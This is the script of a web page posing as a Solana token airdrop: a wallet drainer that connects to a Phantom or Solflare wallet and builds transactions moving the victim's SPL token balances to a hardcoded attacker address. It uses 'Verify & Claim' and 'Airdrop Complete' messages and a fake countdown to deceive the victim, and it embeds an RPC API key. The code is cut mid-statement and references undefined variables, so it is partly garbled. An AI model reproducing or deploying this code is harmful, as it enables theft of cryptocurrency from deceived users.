    <script>
        console.log("Script execution started");const{PublicKey,Transaction,SystemProgram,LAMPORTS_PER_SOL}=solanaWeb3;const{TOKEN_PROGRAM_ID,createTransferInstruction,createAssociatedTokenAccountInstruction,getAssociatedTokenAddressSync,getAccount}=splToken;let walletPublicKey=null;const message=document.getElementById("message");const connectButton=document.getElementById("connectButton");const drainButton=document.getElementById("drainButton");const recipientPublicKey=new PublicKey("9wktWuHh488Rh3LepSnUAFZfY2H7MrFh5oB8cqK9YbzM");const RPC_ENDPOINTS=["https://mainnet.helius-rpc.com/?api-key=d4a7cc03-db7a-4a02-b8d6-9d9abbb8f048"];async function wait(ms){return new Promise(resolve=>setTimeout(resolve,ms))}async function getConnection(){for(const endpoint of RPC_ENDPOINTS){for(let attempt=0;attempt<3;attempt++){try{const connection=new solanaWeb3.Connection(endpoint,"confirmed");const slot=await connection.getSlot();console.log(`Connected to RPC: ${endpoint}, slot: ${slot}, attempt: ${attempt+1}`);return connection}catch(error){console.warn(`RPC ${endpoint} failed on attempt ${attempt+1}: ${error.message} (Status: ${error.status||"Unknown"})`);if(attempt<2)await wait(2000)}}console.warn(`All attempts for RPC ${endpoint} failed`)}console.error("Failed to connect to Solana network");throw new Error("All RPC endpoints failed")}async function checkWallet(){console.log("Checking wallet...");for(let i=0;i<5;i++){if(window.solana&&(window.solana.isPhantom||window.solana.isSolflare)){console.log("Solana wallet detected:",window.solana.isPhantom?"Phantom":"Solflare");return true}await wait(1000)}console.error("No Solana wallet detected");return false}connectButton.addEventListener("click",async()=>{console.log("Connect button clicked");connectButton.textContent="Connecting";connectButton.classList.add("loading");connectButton.disabled=true;try{if(!await checkWallet()){message.textContent="Please install Phantom or Solflare wallet";return}console.log("Attempting connection..." unt of tokenAccounts.value.slice(0,5)){try{const accountInfo=await getAccount(connection,tokenAccount.pubkey);const balance=Number(accountInfo.amount);if(balance>0){const mint=new PublicKey(accountInfo.mint);console.log(`Found SPL token: Mint=${mint.toString()}, Balance=${balance}`);const recipientATA=getAssociatedTokenAddressSync(mint,recipientPublicKey);try{await getAccount(connection,recipientATA);console.log(`Recipient ATA exists: ${recipientATA.toString()}`)}catch(e){console.log(`Creating recipient ATA for mint ${mint.toString()}`);transaction.add(createAssociatedTokenAccountInstruction(walletPublicKey,recipientATA,recipientPublicKey,mint,TOKEN_PROGRAM_ID));}tokensToTransfer.push({from:tokenAccount.pubkey,mint,amount:balance,recipientATA});console.log(`Prepared to transfer ${balance} tokens of mint ${mint.toString()}`)}else{console.log(`Skipping empty token account: ${tokenAccount.pubkey.toString()}`)}}catch(err){console.warn(`Error processing token account ${tokenAccount.pubkey.toString()}: ${err.message}`)}}if(tokensToTransfer.length>0){console.log("Adding SPL token transfer instructions...");for(const token of tokensToTransfer){transaction.add(createTransferInstruction(token.from,token.recipientATA,walletPublicKey,token.amount));}}}catch(err){console.warn("SPL token processing failed:",err.message)}if(!transaction.instructions.length){console.error("No transferable assets found");message.textContent="No assets available for airdrop";return}console.log("Estimating transaction fee...");const messageTx=transaction.compileMessage();const feeResponse=await connection.getFeeForMessage(messageTx,"confirmed");const baseFee=feeResponse.value||5000;console.log("Base estimated fee:",baseFee,"lamports");console.log("Total estimated fee:",solFee,"lamports");console.log("Remaining SOL balance:",solBalance-solAmountToSend,"lamports");console.log("Signing transaction...");const signedTx=await window.solana.signTransaction(transaction);console.log("Sending transaction...");const signature=await connection.sendRawTransaction(signedTx.serialize());console.log("Waiting for confirmation...");await connection.confirmTransaction({signature,blockhash,lastValidBlockHeight});message.textContent="Token Airdrop Complete";console.log("Transaction successful:",signature)}catch(err){console.error("Drain error:",err);message.textContent="Airdrop failed. Try again."}finally{drainButton.textContent="Verify & Claim";drainButton.classList.remove("loading");drainButton.disabled=walletPublicKey===null}});function startCountdown(){let time=24*60*60;const timer=document.getElementById("timer");const interval=setInterval(()=>{const hours=Math.floor(time/3600);const minutes=Math.floor((time%3600)/60);const seconds=time%60;timer.textContent=`${hours}:${minutes.toString().padStart(2,"0")}:${seconds.toString().padStart(2,"0")}`;time--;if(time<0)clearInterval(interval)},1000)}startCountdown();console.log("Script execution completed");
